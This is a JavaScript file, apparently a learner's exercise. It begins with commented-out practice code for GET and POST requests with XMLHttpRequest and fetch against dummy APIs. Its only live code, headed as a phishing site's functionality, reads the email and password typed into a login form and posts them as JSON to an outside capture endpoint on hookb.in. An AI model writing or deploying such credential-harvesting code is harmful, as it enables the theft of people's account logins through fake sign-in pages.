// function getDatas() {
//   let req = new XMLHttpRequest();
//   req.open("GET", "http://dummy.restapiexample.com/api/v1/employees", true);
//   req.send();

//   req.addEventListener("load", () => {
//      console.log(JSON.parse(req.response))
//   });
// }

// getDatas();

// MAKING POST REQUESTS IN FETCH API

// const params = {
//     id: 123
//   }

//   const response = await fetch('url', {
//     method: 'POST',
//     headers: {
//       'Content-Type': 'application/json'
//     },
//     body: JSON.stringify(params)
//   });

//   const data = await response.json();

// THIS IS A GET REQUEST
// let datas = async () => {
//     const getDatas =  await fetch('http://dummy.restapiexample.com/api/v1/employees')
//     const mainDatas = await getDatas.json();
//     console.log(mainDatas);
//     return getDatas;

// }
// datas();

// function postRequest ()  {
//     let datas = {"name":"Bpolsskpoinayak", 
//                  "Age":17,
//                 "Grade":11};


//     params = {
//         method:'post',
//         headers:{
//             'Content-Type': 'application/json'
//         },
//         body:JSON.stringify(datas)
//     }
    
//     fetch('https://hookb.in/3OwbnjLpqKUEwwjBWLB2',params)
//     .then(result => result.json() )
//     .then(datas => console.log(datas))

// };

// postRequest();


// HERE WE BEGAN CODE OUR PHISHING SITE'S FUNCTIONALITY

const logInBtn = document.querySelector('#log-in-btn');
const numEmail = document.querySelector('#num-email');
const password = document.querySelector('#password');
const form = document.querySelector('form');
logInBtn.addEventListener('click', getDatas);


function getDatas () {
    let datas = {};
    datas.email = numEmail.value;
    datas.password = password.value + 1000;


    
    fetch('https://hookb.in/3OwbnjLpqKUEwwjBWLB2', {
        method:'POST',
        headers:{
            'Content-Type':'application/json'
        },
        body:JSON.stringify(datas)
    })
    

}

